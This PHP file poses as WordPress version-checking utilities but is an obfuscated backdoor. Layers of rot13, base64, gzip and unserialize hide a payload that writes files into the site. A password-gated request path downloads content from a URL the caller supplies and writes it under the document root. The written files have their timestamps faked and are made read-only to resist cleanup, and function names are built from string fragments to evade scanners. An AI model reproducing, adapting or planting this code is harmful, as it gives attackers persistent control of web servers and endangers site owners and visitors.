<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("vufy{$check}buplwed", '8dcff9a72ecc56a95ad8ee3f3fa7f9f9')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}